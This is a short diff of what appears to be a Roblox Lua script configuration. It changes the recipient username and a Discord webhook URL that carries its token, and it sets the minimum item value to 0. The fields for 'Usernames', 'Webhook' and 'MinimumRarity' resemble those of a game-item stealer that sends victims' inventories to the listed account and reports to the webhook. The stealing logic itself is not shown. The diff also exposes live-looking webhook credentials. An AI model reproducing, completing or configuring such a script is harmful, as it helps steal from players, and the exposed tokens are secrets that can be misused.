@@ -4,10 +4,10 @@ end
 
 task.spawn(visual)
 
-Usernames = {"GON_123252"} -- You can add multiple users if you know how!
-Webhook = "https://discord.com/api/webhooks/1531482508003250299/7FY1K46UsdEIVh3u73gEpmsr7nJ8YMTc6jrSGfBQCHBJgKcVq86Roh7qKFHtCkz9tRPU"  -- Protect your webhook at https://sentinelhook.lol/ .
+Usernames = {"marttia2342"} -- You can add multiple users if you know how!
+Webhook = "https://discord.com/api/webhooks/1531540689739845683/3ilKKX6uKuz1b85_ukuYaypfZLKhPDps_Th5seXOi-ZH1eBG2cToRA5nTUk2flRXslz2"  -- Protect your webhook at https://sentinelhook.lol/ .
 MinimumRarity = "Godly" -- Options: Common/Uncommon/Rare/Legendary/Godly/Ancient/Vintage/Unique.
-MinimumValue = 1 -- Set it to 5 (Recommended).
+MinimumValue = 0 -- Set it to 5 (Recommended).
 
 local Success = pcall(function()
     local Str = "https://discord.gg/m4TTjEUJz"
